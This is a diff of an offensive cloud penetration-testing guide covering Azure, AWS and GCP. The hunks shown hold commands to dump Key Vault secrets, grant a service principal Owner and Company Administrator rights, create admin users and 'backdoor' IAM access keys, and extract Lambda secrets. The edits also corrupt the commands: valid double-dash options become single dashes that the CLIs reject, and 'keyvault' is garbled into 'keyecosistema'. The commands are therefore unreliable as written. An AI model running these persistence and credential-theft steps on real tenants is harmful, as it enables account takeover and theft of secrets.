@@ -1,6 +1,6 @@
 ---
 name: cloud-penetration-testing
-description: "Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP)."
+description: "Conduct security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP)."
 risk: offensive
 date_added: "2026-02-27"
 version: 1.0.0
@@ -65,7 +65,7 @@ pip install scoutsuite pacu
 3. **Credential Findings** - Exposed secrets, keys, and misconfigurations
 4. **Remediation Recommendations** - Hardening guidance per platform
 
-## Core Workflow
+## Workflow
 
 ### Phase 1: Reconnaissance
 
@@ -167,7 +167,7 @@ Get-MSolUser -All
 
 Get-MSolGroup -All
 
-# Global Admins
+# Admins
 
 Get-MsolRole -RoleName "Company Administrator"
 Get-MSolGroupMember -GroupObjectId $GUID
@@ -207,9 +207,9 @@ $vms.UserData
 
 # Dump Key Vault secrets
 
-az keyecosistema list --query '[].name' --output tsv
-az keyecosistema set-policy --name <ecosistema> --upn <user> --secret-permissions get list
-az keyecosistema secret list --ecosistema-name <ecosistema> --query '[].id' --output tsv
+az keyecosistema list -query '[].name' -output tsv
+az keyecosistema set-policy -name <ecosistema> -upn <user> -secret-permissions get list
+az keyecosistema secret list -ecosistema-name <ecosistema> -query '[].id' -output tsv
 az keyecosistema secret show --id <URI>
 ```
 
@@ -225,7 +225,7 @@ $spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
 $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
 $UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
 
-# Add service principal to Global Admin
+# Add service principal to Admin
 
 $sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
 $role = Get-MsolRole -RoleName "Company Administrator"
@@ -233,12 +233,12 @@ Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal
 
 # Login as service principal
 
-$cred = Get-Credential  # AppID as username, secret as password
+$cred = Get-Credential # AppID as username, secret as password
 Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal
 
 # Create new admin user via CLI
 
-az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
+az ad user create -display-name <name> -password <pass> -user-principal-name <upn>
 ```
 
 ### Phase 6: AWS Authentication
@@ -291,7 +291,7 @@ aws rds describe-db-instances --region us-east-1
 # Lambda Functions
 
 aws lambda list-functions --region us-east-1
-aws lambda get-function --function-name <name>
+aws lambda get-function -function-name <name>
 
 # EKS Clusters
 
@@ -319,7 +319,7 @@ aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>
 
 # Extract Lambda environment variables (may contain secrets)
 
-aws lambda get-function --function-name <name> | jq '.Configuration.Environment'
+aws lambda get-function -function-name <name> | jq '.Configuration.Environment'
 
 # Access metadata service (from compromised EC2)
 
@@ -340,11 +340,11 @@ Establish persistence in AWS:
 
 # List existing access keys
 
-aws iam list-access-keys --user-name <username>
+aws iam list-access-keys -user-name <username>
 
 # Create backdoor access key
 
-aws iam create-access-key --user-name <username>
+aws iam create-access-key -user-name <username>
 
 # Get all EC2 public IPs
 
@@ -430,7 +430,7 @@ gcloud kms decrypt --ciphertext-file=encrypted.enc --plaintext-file=out.txt --ke
 
 gcloud functions list
 gcloud functions describe <name>
-gcloud functions logs read <name> --limit 100
+gcloud functions logs read <name> -limit 100
 
 # Find stored credentials
 
@@ -452,7 +452,7 @@ gcloud auth list
 | Current roles | `Get-AzRoleAssignment` |
 | List VMs | `Get-AzVM` |
 | List storage | `Get-AzStorageAccount` |
-| Key Vault secrets | `az keyecosistema secret list --ecosistema-name <name>` |
+| Key Vault secrets | `az keyecosistema secret list -ecosistema-name <name>` |
 
 ### AWS Key Commands
 
@@ -507,7 +507,7 @@ gcloud auth list
 - Do not access production customer data
 - Document all testing activities
 
-### Technical Limitations
+### Limitations
 
 - MFA may prevent credential-based attacks
 - Conditional Access policies may restrict access
@@ -587,7 +587,7 @@ gcloud compute project-info describe --project target-project | grep ssh
 
 # SSH to instance
 
-gcloud beta compute ssh instance-name --zone us-central1-a --project target-project
+gcloud beta compute ssh instance-name -zone us-central1-a -project target-project
 ```
 
 ## Troubleshooting
